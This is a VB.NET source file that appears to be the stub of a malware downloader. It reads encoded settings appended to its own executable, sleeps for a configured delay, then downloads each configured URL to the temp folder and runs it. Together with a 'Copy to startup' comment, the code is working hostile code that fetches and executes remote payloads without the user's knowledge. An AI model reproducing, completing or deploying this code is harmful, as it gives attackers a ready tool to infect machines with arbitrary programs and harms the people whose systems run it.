Module Module1

    Const grandfather As String = "\||/"
    Const father As String = "|*--*|"
    Const son As String = "|}{|"

    Dim mything As String
    Dim parametersencoded As String
    Dim parameters() As String
    Dim myotherthings() As String
    Dim wc As New System.Net.WebClient()
    Dim pth As String

    Sub Main()

        Try

            ' Source code
            mything = System.Text.Encoding.Default.GetString(System.IO.File.ReadAllBytes(Application.ExecutablePath))

            ' Encoded parameters
            parametersencoded = Split(mything, grandfather)(1)

            ' Parameters
            parameters = Split(Base64ToString(parametersencoded), father)

            ' Links
            myotherthings = Split(parameters(0), son)

            ' Copy to startup
            MsgBox(parameters(2))

            ' Delay
            System.Threading.Thread.Sleep(TimeSpan.FromSeconds(CDbl(parameters(1))))

            For Each lnk As String In myotherthings
                If lnk <> "" Then
                    pth = System.IO.Path.GetTempPath & System.IO.Path.GetFileName(lnk)
                    wc.DownloadFile(lnk, pth)
                    Process.Start(pth)
                End If
            Next

        Catch ex As Exception
            MsgBox(ex.Message)
        End Try

    End Sub


    ' Base64 to String
    Function Base64ToString(str As String) As String
        Return System.Text.Encoding.Default.GetString(Convert.FromBase64String(str))
    End Function

End Module
